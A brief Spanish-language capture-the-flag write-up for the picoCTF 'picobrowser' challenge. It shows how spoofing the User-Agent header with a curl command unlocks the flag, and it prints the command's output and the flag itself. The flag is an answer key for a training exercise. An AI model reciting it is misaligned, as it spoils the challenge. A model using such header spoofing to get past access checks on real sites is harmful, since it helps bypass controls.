### picobrowser

### DESCRIPCIÓN

This website can be rendered only by picobrowser, go and catch the flag!http://fickle-tempest.picoctf.net:53474
### SOLUCIÓN

Usando alguna herramienta que nos permita modificar el buscador desde el cual nos conectamos podemos modificarlo para que concida con "picobrowser"

picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}

Se puede hacer desde la consola usando la siguiente linea de comandos:
```
curl -s http://fickle-tempest.picoctf.net:53474/flag -H 'User-Agent: picobrowser' | grep pico

UZIEL_M-picoctf@webshell:~$ curl -s http://fickle-tempest.picoctf.net:53474/flag -H 'User-Agent: picobrowser' | grep pico
         <!-- <strong>Title</strong> --> picobrowser!
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{p1c0_s3cr3t_ag3nt_fba5c48f}</code></p>

```  


### NOTAS ADICIONALES



### REFERENCIAS